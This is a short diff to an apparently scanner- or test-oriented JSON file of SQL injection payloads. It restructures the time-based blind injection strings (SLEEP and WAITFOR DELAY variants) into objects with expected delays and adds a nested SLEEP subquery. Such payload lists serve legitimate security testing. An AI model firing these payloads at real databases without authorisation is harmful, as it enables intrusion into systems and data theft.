@@ -13,7 +13,17 @@
     "';--"
   ],
   "time_based": [
-    "1' AND SLEEP(5)--",
-    "'; WAITFOR DELAY '0:0:5'--"
+    {
+      "payload": "1' AND SLEEP(5)--",
+      "delay": 5
+    },
+    {
+      "payload": "'; WAITFOR DELAY '0:0:5'--",
+      "delay": 5
+    },
+    {
+      "payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--",
+      "delay": 10
+    }
   ]
 }
